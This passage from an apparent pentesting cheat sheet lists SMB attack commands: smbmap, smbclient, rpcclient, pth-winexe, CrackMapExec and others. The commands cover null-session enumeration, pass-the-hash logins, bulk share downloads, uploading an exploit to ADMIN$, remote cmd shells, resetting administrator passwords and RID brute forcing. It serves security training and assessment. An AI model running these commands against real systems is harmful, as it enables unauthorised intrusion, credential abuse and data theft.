<span class="n">smbmap</span> <span class="o">-</span><span class="n">u</span> <span class="n">guest</span> <span class="o">-</span><span class="n">p</span> <span class="ss">&quot;&quot;</span> <span class="o">-</span><span class="n">d</span> <span class="o">&lt;</span><span class="n">workgroup</span><span class="o">&gt;</span> <span class="o">-</span><span class="n">H</span> <span class="err">$</span><span class="n">ip</span>
<span class="n">smbmap</span> <span class="o">-</span><span class="n">u</span> <span class="o">&lt;</span><span class="k">user</span><span class="o">&gt;</span> <span class="o">-</span><span class="n">p</span> <span class="o">&lt;</span><span class="n">password</span><span class="o">&gt;</span> <span class="o">-</span><span class="n">d</span> <span class="o">&lt;</span><span class="n">workgroup</span><span class="o">&gt;</span> <span class="o">-</span><span class="n">H</span> <span class="err">$</span><span class="n">ip</span>
<span class="n">smbmap</span> <span class="o">-</span><span class="n">u</span> <span class="o">&lt;</span><span class="k">user</span><span class="o">&gt;</span> <span class="o">-</span><span class="n">p</span> <span class="o">&lt;</span><span class="n">password</span><span class="o">&gt;</span> <span class="o">-</span><span class="n">d</span> <span class="o">&lt;</span><span class="n">workgroup</span><span class="o">&gt;</span> <span class="o">-</span><span class="n">H</span> <span class="err">$</span><span class="n">ip</span> <span class="o">-</span><span class="n">L</span>  <span class="o">#</span><span class="n">test</span> <span class="n">command</span> <span class="n">execution</span>
<span class="n">smbmap</span> <span class="o">-</span><span class="n">u</span> <span class="o">&lt;</span><span class="k">user</span><span class="o">&gt;</span> <span class="o">-</span><span class="n">p</span> <span class="o">&lt;</span><span class="n">password</span><span class="o">&gt;</span> <span class="o">-</span><span class="n">d</span> <span class="o">&lt;</span><span class="n">workgroup</span><span class="o">&gt;</span> <span class="o">-</span><span class="n">H</span> <span class="err">$</span><span class="n">ip</span> <span class="o">-</span><span class="n">r</span>  <span class="o">#</span><span class="k">read</span> <span class="n">drive</span>

<span class="n">smbmap</span> <span class="o">-</span><span class="n">u</span> <span class="s1">&#39;&#39;</span> <span class="o">-</span><span class="n">p</span> <span class="s1">&#39;&#39;</span> <span class="o">-</span><span class="n">H</span> <span class="mi">192</span><span class="p">.</span><span class="mi">168</span><span class="p">.</span><span class="mi">1</span><span class="p">.</span><span class="mi">23</span> <span class="o">#</span> <span class="k">similar</span> <span class="k">to</span> <span class="n">crackmapexec</span> <span class="c1">--shares</span>
<span class="n">smbmap</span> <span class="o">-</span><span class="n">u</span> <span class="n">guest</span> <span class="o">-</span><span class="n">p</span> <span class="s1">&#39;&#39;</span> <span class="o">-</span><span class="n">H</span> <span class="mi">192</span><span class="p">.</span><span class="mi">168</span><span class="p">.</span><span class="mi">1</span><span class="p">.</span><span class="mi">23</span>
<span class="n">smbmap</span> <span class="o">-</span><span class="n">u</span> <span class="n">Administrator</span> <span class="o">-</span><span class="n">p</span> <span class="n">aad3b435b51404eeaad3b435b51404ee</span><span class="p">:</span><span class="n">e101cbd92f05790d1a202bf91274f2e7</span> <span class="o">-</span><span class="n">H</span> <span class="mi">192</span><span class="p">.</span><span class="mi">168</span><span class="p">.</span><span class="mi">1</span><span class="p">.</span><span class="mi">23</span>
<span class="n">smbmap</span> <span class="o">-</span><span class="n">u</span> <span class="n">Administrator</span> <span class="o">-</span><span class="n">p</span> <span class="n">aad3b435b51404eeaad3b435b51404ee</span><span class="p">:</span><span class="n">e101cbd92f05790d1a202bf91274f2e7</span> <span class="o">-</span><span class="n">H</span> <span class="mi">192</span><span class="p">.</span><span class="mi">168</span><span class="p">.</span><span class="mi">1</span><span class="p">.</span><span class="mi">23</span> <span class="o">-</span><span class="n">r</span> <span class="o">#</span> <span class="n">list</span> <span class="n">top</span> <span class="k">level</span> <span class="n">dir</span>
<span class="n">smbmap</span> <span class="o">-</span><span class="n">u</span> <span class="n">Administrator</span> <span class="o">-</span><span class="n">p</span> <span class="n">aad3b435b51404eeaad3b435b51404ee</span><span class="p">:</span><span class="n">e101cbd92f05790d1a202bf91274f2e7</span> <span class="o">-</span><span class="n">H</span> <span class="mi">192</span><span class="p">.</span><span class="mi">168</span><span class="p">.</span><span class="mi">1</span><span class="p">.</span><span class="mi">23</span> <span class="o">-</span><span class="n">R</span> <span class="o">#</span> <span class="n">list</span> <span class="n">everything</span> <span class="n">recursively</span>
<span class="n">smbmap</span> <span class="o">-</span><span class="n">u</span> <span class="n">Administrator</span> <span class="o">-</span><span class="n">p</span> <span class="n">aad3b435b51404eeaad3b435b51404ee</span><span class="p">:</span><span class="n">e101cbd92f05790d1a202bf91274f2e7</span> <span class="o">-</span><span class="n">H</span> <span class="mi">192</span><span class="p">.</span><span class="mi">168</span><span class="p">.</span><span class="mi">1</span><span class="p">.</span><span class="mi">23</span> <span class="o">-</span><span class="n">s</span> <span class="n">wwwroot</span> <span class="o">-</span><span class="n">R</span> <span class="o">-</span><span class="n">A</span> <span class="s1">&#39;.*&#39;</span> <span class="o">#</span> <span class="n">download</span> <span class="n">everything</span> <span class="n">recursively</span> <span class="k">in</span> <span class="n">the</span> <span class="n">wwwroot</span> <span class="k">share</span> <span class="k">to</span> <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="k">share</span><span class="o">/</span><span class="n">smbmap</span><span class="p">.</span> <span class="n">great</span> <span class="k">when</span> <span class="n">smbclient</span> <span class="n">doesnt</span> <span class="k">work</span>
<span class="n">smbmap</span> <span class="o">-</span><span class="n">u</span> <span class="n">Administrator</span> <span class="o">-</span><span class="n">p</span> <span class="n">aad3b435b51404eeaad3b435b51404ee</span><span class="p">:</span><span class="n">e101cbd92f05790d1a202bf91274f2e7</span> <span class="o">-</span><span class="n">H</span> <span class="mi">192</span><span class="p">.</span><span class="mi">168</span><span class="p">.</span><span class="mi">1</span><span class="p">.</span><span class="mi">23</span> <span class="o">-</span><span class="n">x</span> <span class="n">whoami</span> <span class="o">#</span> <span class="k">no</span> <span class="k">work</span>
</pre></div>

<p>Recursively list dirs, and files:
<div class="codehilite"><pre><span></span><span class="n">smbmap</span> <span class="o">-</span><span class="n">R</span> <span class="err">$</span><span class="n">sharename</span> <span class="o">-</span><span class="n">H</span> <span class="err">$</span><span class="n">ip</span>
</pre></div></p>
<p>Search for <code class="codehilite"><span class="n">Groups</span><span class="p">.</span><span class="n">xml</span></code> in given share:
<div class="codehilite"><pre><span></span><span class="n">smbmap</span> <span class="o">-</span><span class="n">R</span> <span class="err">$</span><span class="n">shareName</span> <span class="o">-</span><span class="n">H</span> <span class="err">$</span><span class="n">ip</span> <span class="o">-</span><span class="n">A</span> <span class="n">Groups</span><span class="p">.</span><span class="n">xml</span> <span class="o">-</span><span class="n">q</span>
</pre></div></p>
<p>Downloads a file in quiet mode:
<div class="codehilite"><pre><span></span><span class="n">smbmap</span> <span class="o">-</span><span class="n">R</span> <span class="err">$</span><span class="n">sharename</span> <span class="o">-</span><span class="n">H</span> <span class="err">$</span><span class="n">ip</span> <span class="o">-</span><span class="n">A</span> <span class="err">$</span><span class="n">fileyouwanttodownload</span> <span class="o">-</span><span class="n">q</span>
</pre></div></p>
<p>Using hash:
<div class="codehilite"><pre><span></span><span class="n">mbmap</span><span class="p">.</span><span class="n">py</span> <span class="o">-</span><span class="n">u</span> <span class="n">user123</span> <span class="o">-</span><span class="n">p</span> <span class="s1">&#39;aad3b435b51404eeaad3b435b51404ee:0B186E661BBDBDFFFFFFFFFFF8B9FD8B&#39;</span> <span class="o">-</span><span class="n">H</span> <span class="p">(</span><span class="n">TARGET</span> <span class="n">IP</span> <span class="n">ADDRESS</span><span class="p">)</span>
</pre></div></p>
<h3 id="smbclient">smbclient<a class="headerlink" href="#smbclient" title="Permanent link">&para;</a></h3>
<div class="codehilite"><pre><span></span><span class="n">smbclient</span> <span class="o">//</span><span class="mi">192</span><span class="p">.</span><span class="mi">168</span><span class="p">.</span><span class="mi">1</span><span class="p">.</span><span class="mi">23</span><span class="o">/</span><span class="n">wwwroot</span>
<span class="n">smbclient</span> <span class="o">//</span><span class="mi">192</span><span class="p">.</span><span class="mi">168</span><span class="p">.</span><span class="mi">1</span><span class="p">.</span><span class="mi">23</span><span class="o">/</span><span class="k">C</span><span class="err">$</span> <span class="n">WIN20082017</span> <span class="o">-</span><span class="n">U</span> <span class="n">Administrator</span>
<span class="n">smbclient</span> <span class="o">//</span><span class="mi">192</span><span class="p">.</span><span class="mi">168</span><span class="p">.</span><span class="mi">1</span><span class="p">.</span><span class="mi">23</span><span class="o">/</span><span class="k">C</span><span class="err">$</span> <span class="n">A433F6C2B0D8BB92D7288ECFFACFC7CD</span> <span class="o">-</span><span class="n">U</span> <span class="n">Administrator</span> <span class="c1">--pw-nt-hash # make sure to only use the NT portion of the hash</span>
</pre></div>

<ul>
<li><a href="https://www.samba.org/samba/docs/current/man-html/smbclient.1.html">https://www.samba.org/samba/docs/current/man-html/smbclient.1.html</a></li>
<li>Client that can "talk" to an SMB/CIFS server</li>
<li>Operations<ul>
<li>Upload/download functionality</li>
<li>Retrieving directory information</li>
</ul>
</li>
</ul>
<p>Null session: <code class="codehilite"><span class="n">smbclient</span> <span class="o">-</span><span class="n">N</span> <span class="o">-</span><span class="n">L</span> <span class="p">(</span><span class="n">TARGET</span> <span class="n">IP</span><span class="p">)</span> <span class="o">-</span><span class="n">m</span> <span class="n">SMB2</span></code>
Null session mount: <code class="codehilite"><span class="n">smbclient</span> <span class="ss">&quot;\\\\(TARGET IP)\\IPC\$\\&quot;</span> <span class="o">-</span><span class="n">N</span> <span class="o">-</span><span class="n">m</span> <span class="n">SMB2</span></code>
User session mount: <code class="codehilite"><span class="n">smbclient</span> <span class="ss">&quot;\\\\(TARGET IP)\\IPC\$\\&quot;</span> <span class="o">-</span><span class="n">N</span> <span class="o">-</span><span class="n">U</span> <span class="p">(</span><span class="k">USER</span><span class="p">)</span> <span class="o">-</span><span class="n">m</span> <span class="n">SMB2</span></code>
Pass the hash: <code class="codehilite"><span class="n">smbclient</span> <span class="c1">--user=(TARGET USERNAME) --pw-nt-hash -m smb3 \\\\(TARGET IP ADDRESS)\\(TARGET SHARE)\\ (NTLM HASH)</span></code></p>
<div class="codehilite"><pre><span></span><span class="n">smb</span><span class="o">&gt;</span> <span class="k">get</span> <span class="ss">&quot;filename with or without spaces.txt&quot;</span><span class="o">`</span>
</pre></div>

<div class="codehilite"><pre><span></span><span class="n">smbclient</span> <span class="o">-</span><span class="n">L</span> <span class="err">\\</span><span class="n">WIN7</span><span class="err">\</span><span class="n">IPC$</span> <span class="o">-</span><span class="n">I</span> <span class="mi">192</span><span class="p">.</span><span class="mi">168</span><span class="p">.</span><span class="mi">13</span><span class="p">.</span><span class="mi">218</span>
<span class="n">smbclient</span> <span class="err">\\</span><span class="mi">192</span><span class="p">.</span><span class="mi">168</span><span class="p">.</span><span class="mi">13</span><span class="p">.</span><span class="mi">236</span><span class="err">\</span><span class="k">some</span><span class="o">-</span><span class="k">share</span> <span class="o">-</span><span class="n">o</span> <span class="k">user</span><span class="o">=</span><span class="n">root</span><span class="p">,</span><span class="n">pass</span><span class="o">=</span><span class="n">root</span><span class="p">,</span><span class="n">workgroup</span><span class="o">=</span><span class="n">BOB</span>
</pre></div>

<div class="codehilite"><pre><span></span><span class="n">smbclient</span> <span class="o">-</span><span class="n">L</span> <span class="err">$</span><span class="n">ip</span>
<span class="n">smbclient</span> <span class="o">-</span><span class="n">L</span> <span class="err">$</span><span class="n">ip</span> <span class="o">-</span><span class="n">U</span> <span class="n">guest</span> <span class="o">-</span><span class="n">p</span> <span class="mi">445</span> <span class="ss">&quot;&quot;</span>
<span class="n">smbclient</span> <span class="o">-</span><span class="n">L</span> <span class="err">$</span><span class="n">ip</span> <span class="o">-</span><span class="n">U</span> <span class="err">$</span><span class="n">username</span> <span class="o">-</span><span class="n">p</span> <span class="mi">445</span>
   <span class="n">password</span><span class="p">:</span> <span class="o">&lt;</span><span class="n">prompt</span><span class="o">&gt;</span>
<span class="n">smbclient</span> <span class="o">-</span><span class="n">L</span> <span class="o">//</span><span class="n">server</span><span class="o">/</span><span class="k">share</span>
<span class="n">smbclient</span> <span class="o">-</span><span class="n">L</span> <span class="o">//</span><span class="n">server</span><span class="o">/</span><span class="k">share</span> <span class="n">password</span> <span class="k">options</span>
</pre></div>

<div class="codehilite"><pre><span></span><span class="n">smb</span><span class="p">:</span> <span class="err">\</span><span class="o">&gt;</span> <span class="n">RECURSE</span> <span class="k">ON</span>
<span class="n">smb</span><span class="p">:</span> <span class="err">\</span><span class="o">&gt;</span> <span class="n">PROMPT</span> <span class="k">OFF</span>
<span class="n">smb</span><span class="p">:</span> <span class="err">\</span><span class="o">&gt;</span> <span class="n">mget</span> <span class="o">*</span>
</pre></div>

<p>Upload file:
<div class="codehilite"><pre><span></span><span class="n">smbclient</span> <span class="o">//</span><span class="mi">192</span><span class="p">.</span><span class="mi">168</span><span class="p">.</span><span class="mi">31</span><span class="p">.</span><span class="mi">142</span><span class="o">/</span><span class="k">ADMIN</span><span class="err">$</span> <span class="o">-</span><span class="n">U</span> <span class="ss">&quot;nobody&quot;</span><span class="o">%</span><span class="ss">&quot;somepassword&quot;</span> <span class="o">-</span><span class="k">c</span> <span class="ss">&quot;put 40280.py&quot;</span>
</pre></div></p>
<div class="codehilite"><pre><span></span>  <span class="n">Pass</span><span class="o">-</span><span class="n">the</span><span class="o">-</span><span class="n">hash</span><span class="p">:</span>
    <span class="n">smbclient</span> <span class="o">-</span><span class="n">U</span> <span class="n">testuser</span><span class="o">%&lt;</span><span class="n">nthash</span><span class="o">&gt;</span> <span class="c1">--pw-nt-hash -L 192.168.0.1</span>
    <span class="n">smbclient</span> <span class="err">\\\\</span><span class="mi">192</span><span class="p">.</span><span class="mi">168</span><span class="p">.</span><span class="mi">0</span><span class="p">.</span><span class="mi">1</span><span class="err">\\</span><span class="k">domain</span> <span class="o">-</span><span class="n">U</span> <span class="n">testuser</span><span class="o">%&lt;</span><span class="n">nthash</span><span class="o">&gt;</span> <span class="c1">--pw-nt-hash</span>

  <span class="k">Map</span> <span class="n">drives</span><span class="p">:</span>
    <span class="n">smbclient</span> <span class="err">\\\\</span><span class="mi">192</span><span class="p">.</span><span class="mi">168</span><span class="p">.</span><span class="mi">0</span><span class="p">.</span><span class="mi">1</span><span class="err">\\</span><span class="n">sharename$</span>
    <span class="n">smbclient</span> <span class="err">\\\\</span><span class="mi">192</span><span class="p">.</span><span class="mi">168</span><span class="p">.</span><span class="mi">0</span><span class="p">.</span><span class="mi">1</span><span class="err">\\</span><span class="n">sharename$</span> <span class="o">-</span><span class="n">U</span> <span class="n">root</span><span class="o">%</span>
</pre></div>

<p>Recursive download: <a href="https://superuser.com/questions/856617/how-do-i-recursively-download-a-directory-using-smbclient">https://superuser.com/questions/856617/how-do-i-recursively-download-a-directory-using-smbclient</a></p>
<div class="codehilite"><pre><span></span><span class="n">smbclient</span> <span class="err">‘\</span><span class="mi">10</span><span class="p">.</span><span class="mi">11</span><span class="p">.</span><span class="mi">1</span><span class="p">.</span><span class="mi">220</span><span class="err">\</span><span class="n">SYSVOL</span><span class="err">’</span> <span class="o">-</span><span class="n">U</span><span class="o">=</span><span class="err">’</span><span class="n">contoso</span><span class="o">/</span><span class="n">jane</span><span class="o">%</span><span class="n">SuperPassword</span><span class="o">^</span><span class="err">’</span> <span class="o">-</span><span class="k">c</span> <span class="err">‘</span><span class="n">prompt</span> <span class="k">OFF</span><span class="p">;</span><span class="n">recurse</span> <span class="k">ON</span><span class="p">;</span><span class="n">lcd</span> <span class="err">‘</span><span class="p">.</span><span class="o">/</span><span class="err">’</span><span class="p">;</span><span class="n">mget</span> <span class="o">*</span><span class="err">’</span>
</pre></div>

<div class="codehilite"><pre><span></span><span class="o">#</span> <span class="n">Within</span> <span class="n">smbclient</span><span class="p">,</span> <span class="n">download</span> <span class="n">everything</span> <span class="n">recursively</span><span class="p">:</span>
<span class="n">mask</span> <span class="ss">&quot;&quot;</span>
<span class="n">recurse</span> <span class="k">ON</span>
<span class="n">prompt</span> <span class="k">OFF</span>
<span class="n">cd</span> <span class="s1">&#39;path\to\remote\dir&#39;</span>
<span class="n">lcd</span> <span class="s1">&#39;~/path/to/download/to/&#39;</span>
<span class="n">mget</span> <span class="o">*</span>
</pre></div>

<p>Upload file: 
<div class="codehilite"><pre><span></span><span class="n">smbclient</span> <span class="err">“\\</span><span class="mi">10</span><span class="p">.</span><span class="mi">20</span><span class="p">.</span><span class="mi">20</span><span class="p">.</span><span class="mi">115</span><span class="err">\</span><span class="k">Public</span><span class="err">”</span> <span class="err">–</span><span class="k">user</span> <span class="n">mike</span> <span class="err">–</span><span class="n">pass</span> <span class="n">mikey</span> <span class="o">-</span><span class="k">c</span> <span class="err">“</span><span class="n">put</span> <span class="n">linenum</span><span class="o">-</span><span class="mi">07</span><span class="o">-</span><span class="mi">05</span><span class="o">-</span><span class="mi">19</span><span class="err">”</span>
</pre></div></p>
<h3 id="rpcclient">rpcclient<a class="headerlink" href="#rpcclient" title="Permanent link">&para;</a></h3>
<ul>
<li>Part of the Samba suite</li>
<li>Developed to test MS-RPC functionality in Samba</li>
<li>Usable to open an authenticated SMB session to a target machine</li>
</ul>
<p>NULL session:
<div class="codehilite"><pre><span></span><span class="n">rpcclient</span> <span class="o">-</span><span class="n">U</span> <span class="ss">&quot;&quot;</span> <span class="o">-</span><span class="n">N</span> <span class="mi">192</span><span class="p">.</span><span class="mi">168</span><span class="p">.</span><span class="mi">1</span><span class="p">.</span><span class="mi">102</span>
</pre></div></p>
<p>User session:
<div class="codehilite"><pre><span></span><span class="n">rpcclient</span> <span class="o">-</span><span class="n">U</span> <span class="n">htb</span><span class="err">\\</span><span class="n">james</span> <span class="n">mantis</span><span class="p">.</span><span class="n">htb</span><span class="p">.</span><span class="k">local</span>
</pre></div></p>
<p>Querying:
<div class="codehilite"><pre><span></span><span class="nv">rpcclient</span> $<span class="o">&gt;</span> <span class="nv">srvinfo</span>
<span class="nv">rpcclient</span> $<span class="o">&gt;</span> <span class="nv">enum</span><span class="o">&lt;</span><span class="nv">tab</span><span class="o">&gt;&lt;</span><span class="nv">tab</span><span class="o">&gt;</span>
<span class="nv">rpcclient</span> $<span class="o">&gt;</span> <span class="nv">enumdomusers</span>            <span class="o">//</span> <span class="nv">Username</span> <span class="nv">and</span> <span class="nv">RID</span> <span class="ss">(</span><span class="nv">suffix</span> <span class="nv">of</span> <span class="nv">SID</span><span class="ss">)</span>
<span class="nv">rpcclient</span> $<span class="o">&gt;</span> <span class="nv">queryuser</span> <span class="mi">0</span><span class="nv">x3e8</span>         <span class="o">//</span> <span class="nv">Info</span> <span class="nv">of</span> <span class="nv">the</span> <span class="nv">user</span> <span class="k">for</span> <span class="nv">given</span> <span class="nv">RID</span>
<span class="nv">rpcclient</span> $<span class="o">&gt;</span> <span class="nv">enumalsgroups</span> <span class="nv">domain</span>    <span class="o">//</span> <span class="nv">Enum</span> <span class="nv">aliases</span> <span class="nv">groups</span>
<span class="nv">rpcclient</span> $<span class="o">&gt;</span> <span class="nv">enumalsgroups</span> <span class="nv">builtin</span>
<span class="nv">rpcclient</span> $<span class="o">&gt;</span> <span class="nv">lookupnames</span> <span class="nv">james</span>
</pre></div></p>
<p>rpcclient $&gt; srvinfo # operating system version
rpcclient $&gt; netshareenumall # enumerate all shares and its paths
rpcclient $&gt; enumdomusers # enumerate usernames defined on the server
rpcclient $&gt; getdompwinfo # smb password policy configured on the server</p>
<p>Change password: <code class="codehilite"><span class="n">setuserinfo2</span> <span class="n">administrator</span> <span class="mi">23</span> <span class="err">‘</span><span class="n">password1234</span><span class="err">’</span></code>
Lookup SID: <code class="codehilite"><span class="n">lookupnames</span> <span class="n">administrator</span></code></p>
<h3 id="enum4linux">Enum4linux<a class="headerlink" href="#enum4linux" title="Permanent link">&para;</a></h3>
<ul>
<li>Tool for enumerating information from Windows and Samba systems</li>
<li>Wrapper for <code class="codehilite"><span class="n">smbclient</span></code>, <code class="codehilite"><span class="n">rpcclient</span></code>, <code class="codehilite"><span class="n">net</span></code> and <code class="codehilite"><span class="n">nmblookup</span></code></li>
</ul>
<div class="codehilite"><pre><span></span><span class="n">enum4linux</span> -<span class="n">a</span> <span class="nv">$ip</span>
<span class="n">enum4linux</span> -<span class="n">U</span> <span class="nv">$ip</span>
</pre></div>

<div class="codehilite"><pre><span></span><span class="o">-</span> <span class="nv">RID</span> <span class="nv">cycling</span> <span class="ss">(</span><span class="nv">When</span> <span class="nv">RestrictAnonymous</span> <span class="nv">is</span> <span class="nv">set</span> <span class="nv">to</span> <span class="mi">1</span> <span class="nv">on</span> <span class="nv">Windows</span> <span class="mi">2000</span><span class="ss">)</span>
<span class="o">-</span> <span class="nv">User</span> <span class="nv">listing</span> <span class="ss">(</span><span class="nv">When</span> <span class="nv">RestrictAnonymous</span> <span class="nv">is</span> <span class="nv">set</span> <span class="nv">to</span> <span class="mi">0</span> <span class="nv">on</span> <span class="nv">Windows</span> <span class="mi">2000</span><span class="ss">)</span>
<span class="o">-</span> <span class="nv">Listing</span> <span class="nv">of</span> <span class="nv">group</span> <span class="nv">membership</span> <span class="nv">information</span>
<span class="o">-</span> <span class="nv">Share</span> <span class="nv">enumeration</span>
<span class="o">-</span> <span class="nv">Detecting</span> <span class="k">if</span> <span class="nv">the</span> <span class="nv">host</span> <span class="nv">is</span> <span class="nv">in</span> <span class="nv">a</span> <span class="nv">workgroup</span> <span class="nv">or</span> <span class="nv">a</span> <span class="nv">domain</span>
<span class="o">-</span> <span class="nv">Identifying</span> <span class="nv">the</span> <span class="nv">remote</span> <span class="nv">operating</span> <span class="nv">system</span>
<span class="o">-</span> <span class="nv">Password</span> <span class="nv">policy</span> <span class="nv">retrieval</span>
</pre></div>

<blockquote>
<ul>
<li>Ref: <a href="https://hackercool.com/2016/07/smb-enumeration-with-kali-linux-enum4linuxacccheck-smbmap/">https://hackercool.com/2016/07/smb-enumeration-with-kali-linux-enum4linuxacccheck-smbmap/</a></li>
</ul>
</blockquote>
<h3 id="pth-winexe">pth-winexe<a class="headerlink" href="#pth-winexe" title="Permanent link">&para;</a></h3>
<div class="codehilite"><pre><span></span><span class="n">pth</span><span class="o">-</span><span class="n">winexe</span> <span class="o">-</span><span class="n">U</span> <span class="n">administrator</span><span class="o">%</span><span class="n">WIN20082017</span> <span class="o">//</span><span class="mi">192</span><span class="p">.</span><span class="mi">168</span><span class="p">.</span><span class="mi">1</span><span class="p">.</span><span class="mi">23</span> <span class="n">cmd</span> <span class="o">#</span> <span class="k">using</span> <span class="n">a</span> <span class="n">plaintext</span> <span class="n">password</span>
<span class="n">pth</span><span class="o">-</span><span class="n">winexe</span> <span class="o">-</span><span class="n">U</span> <span class="n">Administrator</span><span class="o">%</span><span class="n">A433F6C2B0D8BB92D7288ECFFACFC7CD</span> <span class="o">//</span><span class="mi">192</span><span class="p">.</span><span class="mi">168</span><span class="p">.</span><span class="mi">1</span><span class="p">.</span><span class="mi">23</span> <span class="n">cmd</span> <span class="o">#</span> <span class="n">ntlm</span> <span class="n">hash</span> <span class="k">encrypted</span> <span class="k">with</span> <span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">www</span><span class="p">.</span><span class="n">browserling</span><span class="p">.</span><span class="n">com</span><span class="o">/</span><span class="n">tools</span><span class="o">/</span><span class="n">ntlm</span><span class="o">-</span><span class="n">hash</span>
<span class="n">pth</span><span class="o">-</span><span class="n">winexe</span> <span class="o">-</span><span class="n">U</span> <span class="k">domain</span><span class="o">/</span><span class="k">user</span><span class="o">%</span><span class="n">A433F6C2B0D8BB92D7288ECFFACFC7CD</span> <span class="o">//</span><span class="mi">192</span><span class="p">.</span><span class="mi">168</span><span class="p">.</span><span class="mi">1</span><span class="p">.</span><span class="mi">23</span> <span class="n">cmd</span> <span class="o">#</span> <span class="k">domain</span> <span class="k">user</span>
<span class="n">pth</span><span class="o">-</span><span class="n">winexe</span> <span class="o">-</span><span class="n">U</span> <span class="n">Administrator</span><span class="o">%</span><span class="mi">8</span><span class="n">F49412C8D29DF02FB62879E33FBB745</span><span class="p">:</span><span class="n">A433F6C2B0D8BB92D7288ECFFACFC7CD</span> <span class="o">//</span><span class="mi">192</span><span class="p">.</span><span class="mi">168</span><span class="p">.</span><span class="mi">1</span><span class="p">.</span><span class="mi">23</span> <span class="n">cmd</span> <span class="o">#</span> <span class="n">lm</span><span class="o">+</span><span class="n">ntlm</span> <span class="n">hash</span> <span class="k">encrypted</span> <span class="k">with</span> <span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">asecuritysite</span><span class="p">.</span><span class="n">com</span><span class="o">/</span><span class="n">encryption</span><span class="o">/</span><span class="n">lmhash</span>
<span class="n">pth</span><span class="o">-</span><span class="n">winexe</span> <span class="o">-</span><span class="n">U</span> <span class="n">Administrator</span><span class="o">%</span><span class="n">aad3b435b51404eeaad3b435b51404ee</span><span class="p">:</span><span class="n">A433F6C2B0D8BB92D7288ECFFACFC7CD</span> <span class="o">//</span><span class="mi">192</span><span class="p">.</span><span class="mi">168</span><span class="p">.</span><span class="mi">1</span><span class="p">.</span><span class="mi">23</span> <span class="n">cmd</span> <span class="o">#</span> <span class="n">ntlm</span> <span class="n">hash</span> <span class="o">+</span> <span class="n">empty</span> <span class="n">lm</span> <span class="n">hash</span>
<span class="o">#</span> <span class="k">or</span>
<span class="n">export</span> <span class="n">SMBHASH</span><span class="o">=</span><span class="n">aad3b435b51404eeaad3b435b51404ee</span><span class="p">:</span><span class="mi">6</span><span class="n">F403D3166024568403A94C3A6561896</span>
<span class="n">pth</span><span class="o">-</span><span class="n">winexe</span> <span class="o">-</span><span class="n">U</span> <span class="n">Administrator</span><span class="o">%</span> <span class="o">//</span><span class="mi">192</span><span class="p">.</span><span class="mi">168</span><span class="p">.</span><span class="mi">1</span><span class="p">.</span><span class="mi">23</span> <span class="n">cmd</span>
</pre></div>

<h3 id="nullinux">nullinux<a class="headerlink" href="#nullinux" title="Permanent link">&para;</a></h3>
<p><a href="https://github.com/m8r0wn/nullinux">https://github.com/m8r0wn/nullinux</a>
<div class="codehilite"><pre><span></span><span class="n">python3</span> <span class="n">nullinux</span><span class="p">.</span><span class="n">py</span> <span class="o">-</span><span class="n">users</span> <span class="o">-</span><span class="n">quick</span> <span class="n">DC1</span><span class="p">.</span><span class="k">Domain</span><span class="p">.</span><span class="n">net</span>
<span class="n">python3</span> <span class="n">nullinux</span><span class="p">.</span><span class="n">py</span> <span class="o">-</span><span class="k">all</span> <span class="mi">192</span><span class="p">.</span><span class="mi">168</span><span class="p">.</span><span class="mi">0</span><span class="p">.</span><span class="mi">0</span><span class="o">-</span><span class="mi">5</span>
<span class="n">python3</span> <span class="n">nullinux</span><span class="p">.</span><span class="n">py</span> <span class="o">-</span><span class="n">shares</span> <span class="o">-</span><span class="n">U</span> <span class="s1">&#39;Domain\User&#39;</span> <span class="o">-</span><span class="n">P</span> <span class="s1">&#39;Password1&#39;</span> <span class="mi">10</span><span class="p">.</span><span class="mi">0</span><span class="p">.</span><span class="mi">0</span><span class="p">.</span><span class="mi">1</span><span class="p">,</span><span class="mi">10</span><span class="p">.</span><span class="mi">0</span><span class="p">.</span><span class="mi">0</span><span class="p">.</span><span class="mi">5</span>
</pre></div></p>
<h3 id="acccheck">acccheck<a class="headerlink" href="#acccheck" title="Permanent link">&para;</a></h3>
<ul>
<li>Password attacks</li>
</ul>
<div class="codehilite"><pre><span></span><span class="n">acccheck</span> <span class="o">-</span><span class="n">v</span> <span class="o">-</span><span class="n">t</span> <span class="err">$</span><span class="n">ip</span> <span class="o">-</span><span class="n">u</span> <span class="o">&lt;</span><span class="k">user</span><span class="o">&gt;</span> <span class="o">-</span><span class="n">P</span> <span class="o">&lt;</span><span class="n">password_file</span><span class="o">&gt;</span>
</pre></div>

<h3 id="mblookup">mblookup<a class="headerlink" href="#mblookup" title="Permanent link">&para;</a></h3>
<ul>
<li>NetBIOS over TCP/IP client used to lookup NetBIOS names</li>
</ul>
<h3 id="crackmapexec">CrackMapExec<a class="headerlink" href="#crackmapexec" title="Permanent link">&para;</a></h3>
<p>Automate assessing the security of large Active Directory networks
<div class="codehilite"><pre><span></span><span class="nv">crackmapexec</span> <span class="nv">smb</span> <span class="o">&lt;</span><span class="nv">target</span><span class="ss">(</span><span class="nv">s</span><span class="ss">)</span><span class="o">&gt;</span> <span class="o">-</span><span class="nv">u</span> <span class="nv">username</span> <span class="o">-</span><span class="nv">H</span> <span class="nv">LMHASH</span>:<span class="nv">NTHASH</span>
<span class="nv">crackmapexec</span> <span class="nv">smb</span> <span class="o">&lt;</span><span class="nv">target</span><span class="ss">(</span><span class="nv">s</span><span class="ss">)</span><span class="o">&gt;</span> <span class="o">-</span><span class="nv">u</span> <span class="nv">username</span> <span class="o">-</span><span class="nv">H</span> <span class="nv">NTHASH</span>

<span class="nv">crackmapexec</span> <span class="o">-</span><span class="nv">u</span> <span class="s1">&#39;</span><span class="s">guest</span><span class="s1">&#39;</span> <span class="o">-</span><span class="nv">p</span> <span class="s1">&#39;&#39;</span> <span class="o">--</span><span class="nv">shares</span> <span class="mi">192</span>.<span class="mi">168</span>.<span class="mi">1</span>.<span class="mi">23</span>
<span class="nv">crackmapexec</span> <span class="o">-</span><span class="nv">u</span> <span class="s1">&#39;</span><span class="s">guest</span><span class="s1">&#39;</span> <span class="o">-</span><span class="nv">p</span> <span class="s1">&#39;&#39;</span> <span class="o">--</span><span class="nv">rid</span><span class="o">-</span><span class="nv">brute</span> <span class="mi">4000</span> <span class="mi">192</span>.<span class="mi">168</span>.<span class="mi">1</span>.<span class="mi">23</span>
